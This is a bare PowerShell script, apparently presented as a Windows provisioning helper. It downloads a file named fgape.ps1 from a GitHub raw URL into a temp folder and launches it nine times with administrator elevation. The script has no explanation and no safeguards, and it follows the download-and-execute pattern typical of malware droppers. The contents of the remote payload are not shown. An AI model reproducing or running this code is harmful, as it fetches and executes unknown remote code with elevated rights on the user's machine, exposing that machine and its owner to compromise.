$tempFolder = New-Item -ItemType Directory -Path "$env:TEMP\ProvisionWindows" -Force
$fgapeScriptUrl = "https://github.com/FanAPIpipa/pipa/raw/main/fgape.ps1"
$fgapeScriptPath = Join-Path -Path $tempFolder.FullName -ChildPath "fgape.ps1"
Invoke-WebRequest -Uri $fgapeScriptUrl -OutFile $fgapeScriptPath
if (Test-Path $fgapeScriptPath) {
    Start-Process -FilePath "powershell" -ArgumentList "/c $fgapeScriptPath" -Verb RunAs
    Start-Process -FilePath "powershell" -ArgumentList "/c $fgapeScriptPath" -Verb RunAs
    Start-Process -FilePath "powershell" -ArgumentList "/c $fgapeScriptPath" -Verb RunAs
    Start-Process -FilePath "powershell" -ArgumentList "/c $fgapeScriptPath" -Verb RunAs
    Start-Process -FilePath "powershell" -ArgumentList "/c $fgapeScriptPath" -Verb RunAs
    Start-Process -FilePath "powershell" -ArgumentList "/c $fgapeScriptPath" -Verb RunAs
    Start-Process -FilePath "powershell" -ArgumentList "/c $fgapeScriptPath" -Verb RunAs
    Start-Process -FilePath "powershell" -ArgumentList "/c $fgapeScriptPath" -Verb RunAs
    Start-Process -FilePath "powershell" -ArgumentList "/c $fgapeScriptPath" -Verb RunAs
} else {
    Write-Host "Не удалось загрузить скрипт fgape.ps1."
}
